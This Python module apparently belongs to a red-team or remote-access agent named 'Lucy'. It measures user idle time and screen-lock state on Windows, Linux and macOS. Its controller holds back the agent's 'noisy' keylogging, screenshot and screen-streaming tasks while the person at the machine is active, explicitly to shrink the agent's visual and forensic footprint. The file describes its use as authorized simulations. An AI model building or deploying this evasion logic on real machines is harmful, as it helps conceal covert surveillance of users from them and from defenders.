"""
Stealth / adaptive behaviour module for the Lucy agent.

Provides user-activity indicators and a controller that delays or skips noisy
actions when the operator is active at the keyboard/mouse. This reduces the
visual and forensic footprint of the agent during authorized simulations.

Stdlib only — falls back gracefully when OS-specific APIs are unavailable.
"""
import logging
import platform
import subprocess
import threading
import time
from typing import Optional

logger = logging.getLogger("lucy_agent")

SYSTEM = platform.system()

NOISY_MODULES = {"screenshot", "screen_stream", "keylog"}


class StealthController:
    """Adapts agent behaviour based on user activity indicators."""

    def __init__(
        self,
        enabled: bool = True,
        idle_threshold: float = 60.0,
        active_delay: float = 5.0,
        noisy_modules: Optional[set[str]] = None,
    ):
        self.enabled = enabled
        self.idle_threshold = idle_threshold
        self.active_delay = active_delay
        self.noisy_modules = noisy_modules or set(NOISY_MODULES)
        self._last_check = 0.0
        self._cached_indicators: Optional[dict] = None
        self._lock = threading.Lock()

    def get_indicators(self) -> dict:
        """Return current activity indicators, cached for 1 second."""
        with self._lock:
            now = time.time()
            if self._cached_indicators is None or now - self._last_check > 1.0:
                self._cached_indicators = _get_activity_indicators()
                self._last_check = now
            return self._cached_indicators

    @property
    def user_is_active(self) -> bool:
        indicators = self.get_indicators()
        return indicators.get("idle_seconds", 0.0) < self.idle_threshold

    def should_delay(self, module: str, action: str = "run") -> bool:
        """Return True if the action should be delayed because the user is active."""
        if not self.enabled:
            return False
        if module not in self.noisy_modules:
            return False
        return self.user_is_active

    def adaptive_delay(self, module: str, action: str = "run") -> float:
        """Return a recommended delay (seconds) for the requested action."""
        if not self.enabled or not self.should_delay(module, action):
            return 0.0
        return self.active_delay

    def wrap_execute(self, execute_fn, task: dict):
        """Execute a task after the recommended stealth delay."""
        module = task.get("module", "")
        delay = self.adaptive_delay(module, task.get("action", "run"))
        if delay > 0:
            logger.info("Stealth: delaying '%s' for %.1fs (user active)", module, delay)
            time.sleep(delay)
        return execute_fn(task)


# ---------------------------------------------------------------------------
# Activity detection helpers
# ---------------------------------------------------------------------------


def _get_activity_indicators() -> dict:
    idle_seconds = get_idle_seconds()
    return {
        "idle_seconds": idle_seconds,
        "user_active": idle_seconds < 60.0,
        "screen_locked": _is_screen_locked(),
        "timestamp": time.time(),
    }


def get_idle_seconds() -> float:
    """Seconds since last user input (keyboard/mouse). Falls back to 0."""
    try:
        if SYSTEM == "Windows":
            return _get_idle_seconds_windows()
        if SYSTEM == "Linux":
            return _get_idle_seconds_linux()
        if SYSTEM == "Darwin":
            return _get_idle_seconds_macos()
    except Exception as exc:
        logger.debug("Could not detect idle time: %s", exc)
    return 0.0


def _get_idle_seconds_windows() -> float:
    import ctypes
    from ctypes import Structure, c_uint, windll, byref

    class LASTINPUTINFO(Structure):
        _fields_ = [("cbSize", c_uint), ("dwTime", c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = 8
    if not windll.user32.GetLastInputInfo(byref(lii)):
        raise OSError("GetLastInputInfo failed")

    tick_now = windll.kernel32.GetTickCount()
    idle_ms = tick_now - lii.dwTime
    return idle_ms / 1000.0


def _get_idle_seconds_linux() -> float:
    """Try xprintidle, then logind idle hint, then fallback."""
    try:
        out = subprocess.check_output(
            ["xprintidle"], text=True, timeout=3, stderr=subprocess.DEVNULL
        )
        return int(out.strip()) / 1000.0
    except Exception:
        pass

    try:
        out = subprocess.check_output(
            ["loginctl", "show-session", "self", "--property=IdleHint"],
            text=True,
            timeout=3,
            stderr=subprocess.DEVNULL,
        )
        if "IdleHint=yes" in out:
            return 300.0
        if "IdleHint=no" in out:
            return 0.0
    except Exception:
        pass

    raise OSError("No idle-time source available on Linux")


def _get_idle_seconds_macos() -> float:
    """Use ioreg to read kIOHIDSystemIdleTime."""
    try:
        out = subprocess.check_output(
            ["ioreg", "-c", "IOHIDSystem"],
            text=True,
            timeout=3,
            stderr=subprocess.DEVNULL,
        )
        for line in out.splitlines():
            if "HIDIdleTime" in line:
                # line looks like: "HIDIdleTime" = 1234567890
                value = line.split("=")[-1].strip().replace(">", "").replace("<", "")
                return int(value) / 1_000_000_000.0
    except Exception:
        pass
    raise OSError("Could not read macOS idle time")


def _is_screen_locked() -> bool:
    """Best-effort screen lock detection."""
    try:
        if SYSTEM == "Windows":
            import ctypes
            return bool(ctypes.windll.user32.GetForegroundWindow() == 0)
        if SYSTEM == "Darwin":
            out = subprocess.check_output(
                ["python", "-c", "import Quartz; print(Quartz.CGSessionCopyCurrentDictionary())"],
                text=True,
                timeout=3,
                stderr=subprocess.DEVNULL,
            )
            return "OnConsoleKey" in out and "0" in out
    except Exception:
        pass
    return False
